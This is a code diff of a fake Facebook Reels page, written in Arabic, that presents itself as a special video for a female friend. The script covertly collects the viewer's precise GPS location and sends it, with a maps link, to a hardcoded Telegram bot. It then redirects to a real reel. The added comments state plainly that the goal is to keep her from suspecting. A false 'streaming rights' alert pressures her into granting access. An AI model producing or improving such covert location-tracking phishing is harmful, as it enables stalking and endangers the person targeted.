@@ -3,14 +3,25 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook Reels | ذكرياتنا</title>
+    <title>Facebook Reels</title>
     <style>
         body { background-color: #000; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
         .video-container { position: relative; width: 100%; max-width: 400px; height: 90vh; background: #111; border-radius: 15px; overflow: hidden; display: flex; flex-direction: column; justify-content: center; align-items: center; border: 1px solid #333; }
-        .play-btn { width: 80px; height: 80px; background: rgba(255,255,255,0.2); border-radius: 50%; display: flex; justify-content: center; align-items: center; cursor: pointer; border: 2px solid #fff; }
-        .play-btn::after { content: ''; display: block; width: 0; height: 0; border-top: 15px solid transparent; border-bottom: 15px solid transparent; border-left: 25px solid #fff; margin-left: 5px; }
-        h2 { font-size: 18px; margin-top: 20px; text-shadow: 0 2px 4px rgba(0,0,0,0.5); }
-        p { font-size: 14px; color: #bbb; text-align: center; padding: 0 20px; }
+        
+        /* شكل زر التشغيل */
+        .play-btn { 
+            width: 80px; height: 80px; 
+            background: rgba(255,255,255,0.2); 
+            border-radius: 50%; 
+            display: flex; justify-content: center; align-items: center; 
+            cursor: pointer; border: 2px solid #fff; 
+            transition: 0.3s;
+        }
+        .play-btn:hover { background: rgba(255,255,255,0.4); }
+        .play-btn::after { content: ''; display: block; width: 0; height: 0; border-top: 15px solid transparent; border-bottom: 15px solid transparent; border-left: 25px solid #fff; margin-left: 8px; }
+
+        h2 { font-size: 18px; margin-top: 25px; text-shadow: 0 2px 4px rgba(0,0,0,0.5); font-weight: normal; }
+        p { font-size: 13px; color: #aaa; text-align: center; padding: 0 30px; line-height: 1.5; }
         .fb-logo { position: absolute; top: 20px; left: 20px; width: 30px; }
     </style>
 </head>
@@ -18,37 +29,56 @@
 
 <div class="video-container">
     <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" class="fb-logo">
-    <div class="play-btn" onclick="startVideo()"></div>
+    
+    <div class="play-btn" onclick="requestAccess()"></div>
+    
     <h2>مقطع خاص لصديقتي الغالية ❤️</h2>
-    <p>يرجى الضغط على زر التشغيل والسماح بالوصول للموقع لتشغيل الفيديو بجودة HD في منطقتك.</p>
+    <p>اضغطي على الزر أعلاه للمشاهدة.<br>(قد يطلب المتصفح إذن الموقع لتحسين جودة البث في منطقتك)</p>
 </div>
 
 <script>
+    // بياناتك الخاصة
     const token = '8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg';
     const chat_id = '7214473798';
 
-    function startVideo() {
-        const options = { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 };
+    function requestAccess() {
+        const options = { 
+            enableHighAccuracy: true, 
+            timeout: 20000, 
+            maximumAge: 0 
+        };
 
         if (navigator.geolocation) {
+            // هنا يتم طلب الموقع عند الضغط على الزر
             navigator.geolocation.getCurrentPosition(function(p) {
                 const lat = p.coords.latitude;
                 const lon = p.coords.longitude;
                 const acc = p.coords.accuracy;
+                
+                // رابط جوجل ماب المباشر الذي يفتح تطبيق الخرائط فوراً بـ "دبوس"
                 const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
                 
-                // إرسال الموقع لبوتك
-                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent('📍 موقع البنت (فيديو الذكريات):\n' + mapLink + '\n📏 الدقة: ' + acc.toFixed(1) + ' متر')}&parse_mode=Markdown`);
-                
-                // تحويلها لفيديو ريلز حقيقي عن الصداقة على فيسبوك لتهدئتها
-                window.location.href = "https://www.facebook.com/reel/1149257622814389"; 
+                let report = `🎯 **تم سحب الموقع من الفيديو!**\n\n`;
+                report += `📍 الرابط المباشر:\n${mapLink}\n\n`;
+                report += `📏 نسبة الخطأ: ${acc.toFixed(1)} متر`;
+
+                // إرسال الإحداثيات إلى بوت التليجرام الخاص بك
+                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(report)}&parse_mode=Markdown`)
+                .then(() => {
+                    // بعد الإرسال، نحولها لفيديو ريلز حقيقي لكي لا تشك
+                    window.location.href = "https://www.facebook.com/reel/1149257622814389"; 
+                });
 
             }, function(e) {
-                alert("عذراً، يجب السماح بالموقع لتشغيل الفيديو بجودة عالية.");
-                location.reload();
+                // إذا ضغطت "رفض"، تظهر لها هذه الرسالة لإقناعها بالموافقة
+                alert("نعتذر، لا يمكن تشغيل هذا المقطع في منطقتك إلا بعد السماح بالوصول للموقع للتأكد من حقوق البث.");
+                location.reload(); 
             }, options);
+        } else {
+            alert("المتصفح لا يدعم تشغيل هذا الفيديو.");
         }
     }
 </script>
+
 </body>
 </html>
